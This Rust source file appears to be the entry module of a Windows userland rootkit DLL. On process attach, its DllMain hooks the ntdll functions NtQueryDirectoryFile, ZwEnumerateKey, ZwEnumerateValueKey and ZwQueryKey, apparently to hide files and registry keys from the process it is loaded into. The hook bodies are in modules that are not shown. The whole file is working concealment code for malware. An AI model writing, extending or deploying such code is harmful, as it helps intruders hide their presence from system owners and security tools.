mod config;
mod state;
mod fs;
mod registry;

use std::ffi::c_void;
use std::sync::Mutex;

use windows::core::PCSTR;
use windows::Win32::Foundation::BOOL;
use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;

use state::HookedState;

static NT_QUERY_DIRECTORY_FILE: Mutex<Option<HookedState>> = Mutex::new(None);
static ZW_ENUMERATE_KEY: Mutex<Option<HookedState>> = Mutex::new(None);
static ZW_ENUMERATE_VALUE_KEY: Mutex<Option<HookedState>> = Mutex::new(None);
static ZW_QUERY_KEY: Mutex<Option<HookedState>> = Mutex::new(None);

fn register_hook(state: &Mutex<Option<HookedState>>, dll: &str, func: &str, hook: usize) {
    let dll_wide = format!("{}\0", dll);
    let func_wide = format!("{}\0", func);

    unsafe {
        let the_hook = HookedState::hook(
            PCSTR(dll_wide.as_ptr()),
            PCSTR(func_wide.as_ptr()),
            hook,
        );

        *state.lock().unwrap() = Some(the_hook.unwrap());
    }
}

#[unsafe(no_mangle)]
unsafe extern "system" fn DllMain(_dll: isize, reason: u32, _reserved: *mut c_void) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        register_hook(
            &NT_QUERY_DIRECTORY_FILE,
            "ntdll.dll",
            "NtQueryDirectoryFile",
            fs::hook_nt_query_directory_file as usize
        );

        register_hook(
            &ZW_ENUMERATE_KEY,
            "ntdll.dll",
            "ZwEnumerateKey",
            registry::hook_zw_enumerate_key as usize
        );

        register_hook(
            &ZW_ENUMERATE_VALUE_KEY,
            "ntdll.dll",
            "ZwEnumerateValueKey",
            registry::hook_zw_enumerate_value_key as usize
        );

        register_hook(
            &ZW_QUERY_KEY,
            "ntdll.dll",
            "ZwQueryKey",
            registry::hook_zw_query_key as usize
        );
    }

    BOOL(1)
}
